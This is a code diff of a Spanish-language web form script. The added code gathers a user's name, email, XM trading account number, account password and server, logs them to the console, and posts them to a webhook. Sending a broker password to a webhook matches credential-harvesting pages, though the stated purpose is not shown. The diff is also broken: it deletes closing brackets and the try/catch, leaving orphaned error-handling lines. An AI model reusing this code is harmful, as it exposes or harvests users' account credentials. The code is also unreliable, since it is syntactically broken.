@@ -379,26 +379,25 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(data)
-                });
-                
-                const result = await response.json();
-                
-                if (response.ok && result.success) {
-                    // Éxito - Mostrar página de confirmación
-                    document.getElementById('userEmail').textContent = data.email;
-                    document.getElementById('formPage').classList.add('hidden');
-                    document.getElementById('successPage').classList.remove('hidden');
-                    
-                    // Scroll al top
-                    window.scrollTo(0, 0);
-                } else {
-                    // Error del servidor
-                    throw new Error(result.message || 'Error al procesar la solicitud');
-                }
-                alert('Error al procesar la solicitud: ' + error.message);
-                console.error('Error completo:', error);
-            } catch (error) {
-                // Mostrar mensaje de error
+                const formData = {
+    nombre: document.getElementById('nombre').value,
+    correo_electronico: document.getElementById('email').value,
+    cuenta_xm: document.getElementById('cuenta-xm').value,
+    xm_password: document.getElementById('password-xm').value,
+    xm_server: document.getElementById('servidor-xm').value,
+    error: validationResult.error,  // ← CAMBIO AQUÍ
+    message: validationResult.message
+};
+
+console.log('Datos a enviar:', formData);
+
+const response = await fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(formData)
+});
                 console.error('Error:', error);
                 errorText.textContent = error.message || 'Hubo un problema al conectar con el servidor. Por favor intenta de nuevo.';
                 errorMessage.classList.remove('hidden');
